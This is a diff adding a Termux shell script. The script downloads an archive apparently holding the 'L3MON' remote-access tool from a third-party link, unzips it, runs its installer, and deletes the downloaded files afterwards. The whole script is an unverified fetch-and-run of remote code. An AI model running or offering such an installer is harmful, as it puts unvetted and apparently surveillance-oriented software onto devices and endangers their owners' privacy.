@@ -1,0 +1,15 @@
+#!/data/data/com.termux/files/usr/bin/sh
+echo ""
+wget https://link.sandeeptech.com/l3mon
+echo ""
+cd $HOME
+unzip l3mon
+echo""
+cd Lemon
+chmod +x *
+bash lemon.sh -i
+echo
+cd $HOME
+rm l3mon
+rm l3mon-install
+exit
